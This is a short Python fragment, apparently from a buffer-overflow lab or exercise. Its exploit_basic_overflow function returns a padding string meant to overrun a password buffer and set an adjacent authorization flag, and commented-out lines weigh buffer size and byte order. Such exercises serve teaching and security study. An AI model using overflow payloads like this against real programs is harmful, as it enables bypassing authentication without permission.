...
def exploit_basic_overflow() -> str:
    ...
    # password_buffer = b"\x00" * 16
    # # Authorized is 4 bytes i.e. 32-bit int
    # # TODO: should it be big or small endian?
    # # authorized_true = b"\x01\x00\x00\x00"
    # authorized_true = "x"
    # exploit_bytes = password_buffer.decode() + authorized_true

    # exploit_string = exploit_bytes.decode("utf-8")

    # return exploit_string + "\n"
    payload = "AAAABBBBCCCCDDDDEEEEF"
    return payload + "\n"
